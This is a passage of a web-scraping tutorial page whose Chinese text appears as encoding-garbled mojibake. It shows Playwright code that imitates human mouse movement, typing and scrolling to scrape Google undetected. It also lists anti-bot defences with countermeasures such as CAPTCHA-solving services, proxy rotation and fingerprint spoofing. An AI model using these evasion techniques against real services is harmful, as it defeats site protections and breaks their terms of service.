        <span class="n">cp2_x</span> <span class="o">=</span> <span class="n">from_x</span> <span class="o">+</span> <span class="p">(</span><span class="n">to_x</span> <span class="o">-</span> <span class="n">from_x</span><span class="p">)</span> <span class="o">*</span> <span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mf">0.6</span><span class="p">,</span> <span class="mf">0.8</span><span class="p">)</span> <span class="o">+</span> <span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="o">-</span><span class="mi">50</span><span class="p">,</span> <span class="mi">50</span><span class="p">)</span>
        <span class="n">cp2_y</span> <span class="o">=</span> <span class="n">from_y</span> <span class="o">+</span> <span class="p">(</span><span class="n">to_y</span> <span class="o">-</span> <span class="n">from_y</span><span class="p">)</span> <span class="o">*</span> <span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mf">0.6</span><span class="p">,</span> <span class="mf">0.8</span><span class="p">)</span> <span class="o">+</span> <span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="o">-</span><span class="mi">50</span><span class="p">,</span> <span class="mi">50</span><span class="p">)</span>

        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">steps</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
            <span class="n">t</span> <span class="o">=</span> <span class="n">i</span> <span class="o">/</span> <span class="n">steps</span>

            <span class="c1"># ä¸‰æ¬¡è´å¡å°”æ›²çº¿</span>
            <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span><span class="o">-</span><span class="n">t</span><span class="p">)</span><span class="o">**</span><span class="mi">3</span> <span class="o">*</span> <span class="n">from_x</span> <span class="o">+</span> \
                <span class="mi">3</span><span class="o">*</span><span class="p">(</span><span class="mi">1</span><span class="o">-</span><span class="n">t</span><span class="p">)</span><span class="o">**</span><span class="mi">2</span><span class="o">*</span><span class="n">t</span> <span class="o">*</span> <span class="n">cp1_x</span> <span class="o">+</span> \
                <span class="mi">3</span><span class="o">*</span><span class="p">(</span><span class="mi">1</span><span class="o">-</span><span class="n">t</span><span class="p">)</span><span class="o">*</span><span class="n">t</span><span class="o">**</span><span class="mi">2</span> <span class="o">*</span> <span class="n">cp2_x</span> <span class="o">+</span> \
                <span class="n">t</span><span class="o">**</span><span class="mi">3</span> <span class="o">*</span> <span class="n">to_x</span>

            <span class="n">y</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span><span class="o">-</span><span class="n">t</span><span class="p">)</span><span class="o">**</span><span class="mi">3</span> <span class="o">*</span> <span class="n">from_y</span> <span class="o">+</span> \
                <span class="mi">3</span><span class="o">*</span><span class="p">(</span><span class="mi">1</span><span class="o">-</span><span class="n">t</span><span class="p">)</span><span class="o">**</span><span class="mi">2</span><span class="o">*</span><span class="n">t</span> <span class="o">*</span> <span class="n">cp1_y</span> <span class="o">+</span> \
                <span class="mi">3</span><span class="o">*</span><span class="p">(</span><span class="mi">1</span><span class="o">-</span><span class="n">t</span><span class="p">)</span><span class="o">*</span><span class="n">t</span><span class="o">**</span><span class="mi">2</span> <span class="o">*</span> <span class="n">cp2_y</span> <span class="o">+</span> \
                <span class="n">t</span><span class="o">**</span><span class="mi">3</span> <span class="o">*</span> <span class="n">to_y</span>

            <span class="bp">self</span><span class="o">.</span><span class="n">page</span><span class="o">.</span><span class="n">mouse</span><span class="o">.</span><span class="n">move</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mf">0.005</span><span class="p">,</span> <span class="mf">0.02</span><span class="p">))</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">human_typing</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">text</span><span class="p">,</span> <span class="n">element_selector</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ¨¡æ‹Ÿäººç±»æ‰“å­—ï¼ˆå¸¦å»¶è¿Ÿå’Œé”™è¯¯ï¼‰&quot;&quot;&quot;</span>
        <span class="n">element</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">page</span><span class="o">.</span><span class="n">query_selector</span><span class="p">(</span><span class="n">element_selector</span><span class="p">)</span>

        <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span>
            <span class="c1"># éšæœºå»¶è¿Ÿ</span>
            <span class="n">delay</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">gauss</span><span class="p">(</span><span class="mf">0.15</span><span class="p">,</span> <span class="mf">0.05</span><span class="p">)</span>  <span class="c1"># å¹³å‡ 150ms</span>
            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="nb">max</span><span class="p">(</span><span class="mf">0.05</span><span class="p">,</span> <span class="n">delay</span><span class="p">))</span>

            <span class="c1"># å¶å°”æ‰“é”™å­—</span>
            <span class="k">if</span> <span class="n">random</span><span class="o">.</span><span class="n">random</span><span class="p">()</span> <span class="o">&lt;</span> <span class="mf">0.05</span><span class="p">:</span>
                <span class="n">wrong_char</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="s1">&#39;abcdefghijklmnopqrstuvwxyz&#39;</span><span class="p">)</span>
                <span class="n">element</span><span class="o">.</span><span class="n">type</span><span class="p">(</span><span class="n">wrong_char</span><span class="p">)</span>
                <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mf">0.1</span><span class="p">,</span> <span class="mf">0.3</span><span class="p">))</span>
                <span class="c1"># åˆ é™¤é”™å­—</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">page</span><span class="o">.</span><span class="n">keyboard</span><span class="o">.</span><span class="n">press</span><span class="p">(</span><span class="s1">&#39;Backspace&#39;</span><span class="p">)</span>
                <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mf">0.05</span><span class="p">,</span> <span class="mf">0.15</span><span class="p">))</span>

            <span class="n">element</span><span class="o">.</span><span class="n">type</span><span class="p">(</span><span class="n">char</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">human_scroll</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">target_y</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ¨¡æ‹Ÿäººç±»æ»šåŠ¨&quot;&quot;&quot;</span>
        <span class="n">current_y</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">page</span><span class="o">.</span><span class="n">evaluate</span><span class="p">(</span><span class="s1">&#39;window.pageYOffset&#39;</span><span class="p">)</span>

        <span class="n">distance</span> <span class="o">=</span> <span class="n">target_y</span> <span class="o">-</span> <span class="n">current_y</span>
        <span class="n">steps</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">20</span><span class="p">)</span>

        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">steps</span><span class="p">):</span>
            <span class="c1"># åŠ é€Ÿ -&gt; å‡é€Ÿ</span>
            <span class="k">if</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">steps</span> <span class="o">/</span> <span class="mi">2</span><span class="p">:</span>
                <span class="c1"># åŠ é€Ÿé˜¶æ®µ</span>
                <span class="n">scroll_amount</span> <span class="o">=</span> <span class="n">distance</span> <span class="o">/</span> <span class="n">steps</span> <span class="o">*</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">/</span> <span class="p">(</span><span class="n">steps</span> <span class="o">/</span> <span class="mi">2</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="c1"># å‡é€Ÿé˜¶æ®µ</span>
                <span class="n">scroll_amount</span> <span class="o">=</span> <span class="n">distance</span> <span class="o">/</span> <span class="n">steps</span> <span class="o">*</span> <span class="p">(</span><span class="n">steps</span> <span class="o">-</span> <span class="n">i</span><span class="p">)</span> <span class="o">/</span> <span class="p">(</span><span class="n">steps</span> <span class="o">/</span> <span class="mi">2</span><span class="p">)</span>

            <span class="bp">self</span><span class="o">.</span><span class="n">page</span><span class="o">.</span><span class="n">evaluate</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;window.scrollBy(0, </span><span class="si">{</span><span class="n">scroll_amount</span><span class="si">}</span><span class="s1">)&#39;</span><span class="p">)</span>
            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mf">0.02</span><span class="p">,</span> <span class="mf">0.05</span><span class="p">))</span>

        <span class="c1"># å¶å°”å‘ä¸Šå¾®è°ƒ</span>
        <span class="k">if</span> <span class="n">random</span><span class="o">.</span><span class="n">random</span><span class="p">()</span> <span class="o">&lt;</span> <span class="mf">0.3</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">page</span><span class="o">.</span><span class="n">evaluate</span><span class="p">(</span><span class="s1">&#39;window.scrollBy(0, -50)&#39;</span><span class="p">)</span>
            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mf">0.1</span><span class="p">,</span> <span class="mf">0.3</span><span class="p">))</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">human_search</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">query</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ¨¡æ‹Ÿäººç±»æœç´¢è¡Œä¸º&quot;&quot;&quot;</span>
        <span class="c1"># è®¿é—®é¦–é¡µ</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">page</span><span class="o">.</span><span class="n">goto</span><span class="p">(</span><span class="s1">&#39;https://www.google.com&#39;</span><span class="p">)</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mf">0.5</span><span class="p">,</span> <span class="mf">1.5</span><span class="p">))</span>

        <span class="c1"># ç§»åŠ¨é¼ æ ‡åˆ°æœç´¢æ¡†</span>
        <span class="n">search_box</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">page</span><span class="o">.</span><span class="n">query_selector</span><span class="p">(</span><span class="s1">&#39;input[name=&quot;q&quot;]&#39;</span><span class="p">)</span>
        <span class="n">box_position</span> <span class="o">=</span> <span class="n">search_box</span><span class="o">.</span><span class="n">bounding_box</span><span class="p">()</span>

        <span class="c1"># ä»éšæœºä½ç½®ç§»åŠ¨åˆ°æœç´¢æ¡†</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">human_mouse_move</span><span class="p">(</span>
            <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">500</span><span class="p">),</span>
            <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">400</span><span class="p">),</span>
            <span class="n">box_position</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">box_position</span><span class="p">[</span><span class="s1">&#39;width&#39;</span><span class="p">]</span> <span class="o">/</span> <span class="mi">2</span><span class="p">,</span>
            <span class="n">box_position</span><span class="p">[</span><span class="s1">&#39;y&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">box_position</span><span class="p">[</span><span class="s1">&#39;height&#39;</span><span class="p">]</span> <span class="o">/</span> <span class="mi">2</span>
        <span class="p">)</span>

        <span class="c1"># ç‚¹å‡»æœç´¢æ¡†</span>
        <span class="n">search_box</span><span class="o">.</span><span class="n">click</span><span class="p">()</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mf">0.2</span><span class="p">,</span> <span class="mf">0.5</span><span class="p">))</span>

        <span class="c1"># äººç±»åŒ–æ‰“å­—</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">human_typing</span><span class="p">(</span><span class="n">query</span><span class="p">,</span> <span class="s1">&#39;input[name=&quot;q&quot;]&#39;</span><span class="p">)</span>

        <span class="c1"># éšæœºé€‰æ‹©æäº¤æ–¹å¼</span>
        <span class="k">if</span> <span class="n">random</span><span class="o">.</span><span class="n">random</span><span class="p">()</span> <span class="o">&lt;</span> <span class="mf">0.7</span><span class="p">:</span>
            <span class="c1"># 70% æŒ‰å›è½¦</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">page</span><span class="o">.</span><span class="n">keyboard</span><span class="o">.</span><span class="n">press</span><span class="p">(</span><span class="s1">&#39;Enter&#39;</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="c1"># 30% ç‚¹å‡»æœç´¢æŒ‰é’®</span>
            <span class="n">search_button</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">page</span><span class="o">.</span><span class="n">query_selector</span><span class="p">(</span><span class="s1">&#39;input[name=&quot;btnK&quot;]&#39;</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">search_button</span><span class="p">:</span>
                <span class="n">search_button</span><span class="o">.</span><span class="n">click</span><span class="p">()</span>

        <span class="c1"># ç­‰å¾…ç»“æœ</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">page</span><span class="o">.</span><span class="n">wait_for_selector</span><span class="p">(</span><span class="s1">&#39;#search&#39;</span><span class="p">)</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mf">1.0</span><span class="p">,</span> <span class="mf">2.0</span><span class="p">))</span>

        <span class="c1"># æ¨¡æ‹Ÿæµè§ˆç»“æœï¼ˆæ»šåŠ¨ã€é˜…è¯»ï¼‰</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">human_scroll</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">500</span><span class="p">,</span> <span class="mi">1500</span><span class="p">))</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mf">2.0</span><span class="p">,</span> <span class="mf">4.0</span><span class="p">))</span>

        <span class="c1"># æå–ç»“æœ</span>
        <span class="n">results</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="n">items</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">page</span><span class="o">.</span><span class="n">query_selector_all</span><span class="p">(</span><span class="s1">&#39;.g&#39;</span><span class="p">)</span>

        <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">items</span><span class="p">:</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="n">title</span> <span class="o">=</span> <span class="n">item</span><span class="o">.</span><span class="n">query_selector</span><span class="p">(</span><span class="s1">&#39;h3&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">inner_text</span><span class="p">()</span>
                <span class="n">url</span> <span class="o">=</span> <span class="n">item</span><span class="o">.</span><span class="n">query_selector</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">get_attribute</span><span class="p">(</span><span class="s1">&#39;href&#39;</span><span class="p">)</span>
                <span class="n">results</span><span class="o">.</span><span class="n">append</span><span class="p">({</span><span class="s1">&#39;title&#39;</span><span class="p">:</span> <span class="n">title</span><span class="p">,</span> <span class="s1">&#39;url&#39;</span><span class="p">:</span> <span class="n">url</span><span class="p">})</span>
            <span class="k">except</span><span class="p">:</span>
                <span class="k">continue</span>

        <span class="k">return</span> <span class="n">results</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">cleanup</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ¸…ç†&quot;&quot;&quot;</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">browser</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">browser</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">playwright</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">playwright</span><span class="o">.</span><span class="n">stop</span><span class="p">()</span>

<span class="c1"># ä½¿ç”¨ç¤ºä¾‹</span>
<span class="n">simulator</span> <span class="o">=</span> <span class="n">HumanBehaviorSimulator</span><span class="p">()</span>
<span class="n">simulator</span><span class="o">.</span><span class="n">setup</span><span class="p">()</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">results</span> <span class="o">=</span> <span class="n">simulator</span><span class="o">.</span><span class="n">human_search</span><span class="p">(</span><span class="s1">&#39;python web scraping&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Found </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">results</span><span class="p">)</span><span class="si">}</span><span class="s2"> results&quot;</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">results</span><span class="p">[:</span><span class="mi">5</span><span class="p">]:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;- </span><span class="si">{</span><span class="n">result</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="k">finally</span><span class="p">:</span>
    <span class="n">simulator</span><span class="o">.</span><span class="n">cleanup</span><span class="p">()</span>
</code></pre>
      </div>

      <hr />

      <h2 id="é˜²æŠ¤ä¸å¯¹æŠ—æ€»ç»“">é˜²æŠ¤ä¸å¯¹æŠ—æ€»ç»“</h2>

      <h3 id="æœç´¢å¼•æ“é˜²æŠ¤">æœç´¢å¼•æ“é˜²æŠ¤</h3>

      <ol>
        <li><strong>CAPTCHA</strong>: reCAPTCHA v2/v3, hCaptcha</li>
        <li><strong>é¢‘ç‡é™åˆ¶</strong>: IPã€Cookieã€User-Agent</li>
        <li><strong>è¡Œä¸ºåˆ†æ</strong>: é¼ æ ‡è½¨è¿¹ã€æ‰“å­—æ¨¡å¼ã€æµè§ˆå†å²</li>
        <li><strong>è®¾å¤‡æŒ‡çº¹</strong>: Canvasã€WebGLã€Audio</li>
        <li><strong>TLS æŒ‡çº¹</strong>: JA3/JA3S æ£€æµ‹</li>
        <li><strong>API ç­¾å</strong>: æ—¶é—´æˆ³ + å¯†é’¥éªŒè¯</li>
      </ol>

      <h3 id="å¯¹æŠ—ç­–ç•¥-2">å¯¹æŠ—ç­–ç•¥</h3>

      <ol>
        <li><strong>CAPTCHA æ±‚è§£</strong>: ç¬¬ä¸‰æ–¹æœåŠ¡ã€æœºå™¨å­¦ä¹ </li>
        <li><strong>IP è½®æ¢</strong>: ä»£ç†æ± ã€ä½å®…ä»£ç†</li>
        <li><strong>è¡Œä¸ºæ¨¡æ‹Ÿ</strong>: é¼ æ ‡è½¨è¿¹ã€äººç±»åŒ–å»¶è¿Ÿ</li>
        <li><strong>æµè§ˆå™¨æŒ‡çº¹ä¼ªé€ </strong>: Playwright Stealth</li>
        <li><strong>API é€†å‘</strong>: å‘ç°éšè—æ¥å£</li>
        <li><strong>åˆ†å¸ƒå¼çˆ¬å–</strong>: å¤šè´¦å·ã€å¤šåœ°åŸŸ</li>
      </ol>

      <hr />

      <h2 id="æ³•å¾‹ä¸é“å¾·å£°æ˜">æ³•å¾‹ä¸é“å¾·å£°æ˜</h2>

      <p><strong>æœ¬æ–‡ä»…ç”¨äºæŠ€æœ¯ç ”ç©¶å’Œæ•™è‚²ç›®çš„</strong>ã€‚æœªç»æˆæƒçˆ¬å–æœç´¢å¼•æ“å¯èƒ½è¿å:</p>

      <ul>
        <li>æœåŠ¡æ¡æ¬¾ (ToS)</li>
        <li>è®¡ç®—æœºæ¬ºè¯ˆå’Œæ»¥ç”¨æ³• (CFAA)</li>
        <li>å„å›½åçˆ¬è™«æ³•å¾‹</li>
      </ul>

      <p>è¯·ä»…åœ¨æˆæƒç¯å¢ƒä¸‹è¿›è¡Œæµ‹è¯•ï¼Œå°Šé‡æœç´¢å¼•æ“çš„ robots.txtã€‚</p>

      <hr />

      <h2 id="å·¥å…·æ¨è">å·¥å…·æ¨è</h2>

      <h3 id="çˆ¬è™«æ¡†æ¶">çˆ¬è™«æ¡†æ¶</h3>

      <ul>
        <li><strong>Scrapy</strong>: Python çˆ¬è™«æ¡†æ¶</li>
        <li><strong>Playwright</strong>: ç°ä»£æµè§ˆå™¨è‡ªåŠ¨åŒ–</li>
        <li><strong>Puppeteer</strong>: Node.js æµè§ˆå™¨æ§åˆ¶</li>
      </ul>

      <h3 id="ä»£ç†æœåŠ¡">ä»£ç†æœåŠ¡</h3>

      <ul>
        <li><strong>Bright Data</strong>: ä½å®…ä»£ç†æ± </li>
        <li><strong>Oxylabs</strong>: ä¼ä¸šçº§ä»£ç†</li>
        <li><strong>SmartProxy</strong>: ä½æˆæœ¬é€‰æ‹©</li>
      </ul>

      <h3 id="captcha-æ±‚è§£">CAPTCHA æ±‚è§£</h3>

      <ul>
        <li><strong>2Captcha</strong>: äººå·¥æ±‚è§£æœåŠ¡</li>
        <li><strong>Anti-Captcha</strong>: è‡ªåŠ¨è¯†åˆ«</li>
        <li><strong>CapSolver</strong>: AI è¯†åˆ«</li>
      </ul>

      <h3 id="åæ£€æµ‹">åæ£€æµ‹</h3>

      <ul>
        <li><strong>undetected-chromedriver</strong>: å Selenium æ£€æµ‹</li>
        <li><strong>playwright-stealth</strong>: Playwright éšèº«</li>
        <li><strong>puppeteer-extra-plugin-stealth</strong>: Puppeteer éšèº«</li>
      </ul>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#02-Tooling-browser-devtools">æµè§ˆå™¨ DevTools ä½¿ç”¨</a></li>
        <li><a href="../02-Techniques/js_hook.md">JavaScript Hook æŠ€æœ¯</a></li>
        <li><a href="#04-Advanced-Recipes-browser-fingerprinting">æµè§ˆå™¨æŒ‡çº¹è¯†åˆ«</a></li>
        <li><a href="#04-Advanced-Recipes-tls-fingerprinting">TLS æŒ‡çº¹è¯†åˆ«</a></li>
        <li><a href="#04-Advanced-Recipes-captcha-bypass">CAPTCHA è¯†åˆ«ä¸ç»•è¿‡</a></li>
      </ul>

    </div>

    <div class="section" id="06-Engineering-distributed-scraping">
      <h2>51. Distributed Scraping</h2>
      <h1 id="åˆ†å¸ƒå¼çˆ¬è™«æ¶æ„">åˆ†å¸ƒå¼çˆ¬è™«æ¶æ„</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>éšç€æ•°æ®è§„æ¨¡çš„ä¸æ–­æ‰©å¤§ï¼Œå•æœºçˆ¬è™«åœ¨æ€§èƒ½ã€ç¨³å®šæ€§å’Œæ•ˆç‡ä¸Šé‡åˆ°äº†ç“¶é¢ˆã€‚åˆ†å¸ƒå¼çˆ¬è™«æ¶æ„é€šè¿‡å°†çˆ¬å–ä»»åŠ¡åˆ†æ•£åˆ°å¤šå°æœºå™¨ä¸Šå¹¶è¡Œæ‰§è¡Œï¼Œå¯ä»¥å¤§å¹…æå‡çˆ¬å–æ•ˆç‡ï¼Œå®ç°åƒä¸‡çº§ç”šè‡³äº¿çº§çš„æ•°æ®é‡‡é›†ã€‚</p>

      <p>æœ¬æ–‡ä»‹ç»åˆ†å¸ƒå¼çˆ¬è™«çš„æ ¸å¿ƒæ¦‚å¿µã€ä¸»æµæ¡†æ¶ã€æ¶æ„è®¾è®¡ã€å»é‡ç­–ç•¥ä»¥åŠç”Ÿäº§ç¯å¢ƒçš„æœ€ä½³å®è·µã€‚</p>

      <hr />

      <h2 id="åŸºç¡€æ¦‚å¿µ">åŸºç¡€æ¦‚å¿µ</h2>

      <h3 id="å®šä¹‰">å®šä¹‰</h3>

      <p><strong>åˆ†å¸ƒå¼çˆ¬è™«</strong>æ˜¯æŒ‡å°†ç½‘é¡µæŠ“å–ä»»åŠ¡åˆ†æ•£åˆ°å¤šä¸ªç‹¬ç«‹çš„çˆ¬è™«èŠ‚ç‚¹ä¸Šå¹¶è¡Œæ‰§è¡Œçš„çˆ¬è™«ç³»ç»Ÿã€‚ä¸å•æœºçˆ¬è™«ç›¸æ¯”ï¼Œåˆ†å¸ƒå¼çˆ¬è™«é€šè¿‡ä»»åŠ¡åˆ†å‘ã€æ•°æ®å…±äº«å’ŒååŒå·¥ä½œï¼Œå®ç°äº†æ›´é«˜çš„ååé‡å’Œæ›´å¼ºçš„å®¹é”™èƒ½åŠ›ã€‚</p>

      <h3 id="æ ¸å¿ƒåŸç†">æ ¸å¿ƒåŸç†</h3>

      <p>åˆ†å¸ƒå¼çˆ¬è™«çš„æ ¸å¿ƒæ˜¯è§£å†³ä»¥ä¸‹å‡ ä¸ªå…³é”®é—®é¢˜ï¼š</p>

      <ol>
        <li><strong>ä»»åŠ¡è°ƒåº¦</strong>ï¼šå¦‚ä½•æœ‰æ•ˆåœ°å°†å¾…çˆ¬å–çš„ URL åˆ†é…ç»™å„ä¸ªçˆ¬è™«èŠ‚ç‚¹</li>
        <li><strong>URL å»é‡</strong>ï¼šå¦‚ä½•åœ¨å¤šèŠ‚ç‚¹ç¯å¢ƒä¸‹é¿å…é‡å¤çˆ¬å–åŒä¸€ä¸ª URL</li>
        <li><strong>æ•°æ®å…±äº«</strong>ï¼šå¦‚ä½•è®©å„èŠ‚ç‚¹å…±äº«ä»»åŠ¡é˜Ÿåˆ—ã€å»é‡é›†åˆå’Œé…ç½®ä¿¡æ¯</li>
        <li><strong>è´Ÿè½½å‡è¡¡</strong>ï¼šå¦‚ä½•ä¿è¯å„èŠ‚ç‚¹çš„ä»»åŠ¡é‡ç›¸å¯¹å‡è¡¡</li>
        <li><strong>æ•…éšœæ¢å¤</strong>ï¼šå¦‚ä½•å¤„ç†èŠ‚ç‚¹æ•…éšœï¼Œä¿è¯ä»»åŠ¡ä¸ä¸¢å¤±</li>
      </ol>

      <h4 id="å…¸å‹æ¶æ„">å…¸å‹æ¶æ„</h4>

      <pre><code>graph TB
    subgraph Admin["ç®¡ç†æ§åˆ¶å±‚"]
        Monitor[ç›‘æ§ä¸­å¿ƒ&lt;br/&gt;Prometheus + Grafana&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ çˆ¬å–é€Ÿåº¦ç›‘æ§&lt;br/&gt;â€¢ æˆåŠŸç‡ç»Ÿè®¡&lt;br/&gt;â€¢ é˜Ÿåˆ—é•¿åº¦å‘Šè­¦&lt;br/&gt;â€¢ èŠ‚ç‚¹å¥åº·æ£€æŸ¥]
        Config[é…ç½®ä¸­å¿ƒ&lt;br/&gt;Consul / etcd&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ åŠ¨æ€é…ç½®&lt;br/&gt;â€¢ æœåŠ¡å‘ç°&lt;br/&gt;â€¢ å‚æ•°ç®¡ç†]
    end

    subgraph Master["ä»»åŠ¡è°ƒåº¦ä¸­å¿ƒ (Master)"]
        Redis[Redis Cluster&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ ä»»åŠ¡é˜Ÿåˆ— (List/ZSet)&lt;br/&gt;â€¢ URL å»é‡ (Set/BloomFilter)&lt;br/&gt;â€¢ åˆ†å¸ƒå¼é”&lt;br/&gt;â€¢ èŠ‚ç‚¹å¿ƒè·³]
        MQ[æ¶ˆæ¯é˜Ÿåˆ—&lt;br/&gt;RabbitMQ / Kafka&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ ä»»åŠ¡åˆ†å‘&lt;br/&gt;â€¢ ä¼˜å…ˆçº§è°ƒåº¦&lt;br/&gt;â€¢ æŒä¹…åŒ–é˜Ÿåˆ—]
    end

    subgraph Workers["çˆ¬è™«å·¥ä½œèŠ‚ç‚¹ (Workers)"]
        W1[Worker 1&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ Scrapy Engine&lt;br/&gt;â€¢ Downloader&lt;br/&gt;â€¢ Parser&lt;br/&gt;16 å¹¶å‘]
        W2[Worker 2&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ Scrapy Engine&lt;br/&gt;â€¢ Downloader&lt;br/&gt;â€¢ Parser&lt;br/&gt;16 å¹¶å‘]
        W3[Worker 3&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ Scrapy Engine&lt;br/&gt;â€¢ Downloader&lt;br/&gt;â€¢ Parser&lt;br/&gt;16 å¹¶å‘]
        WN[Worker N&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ Scrapy Engine&lt;br/&gt;â€¢ Downloader&lt;br/&gt;â€¢ Parser&lt;br/&gt;16 å¹¶å‘]
    end

    subgraph Proxy["ä»£ç†æ± "]
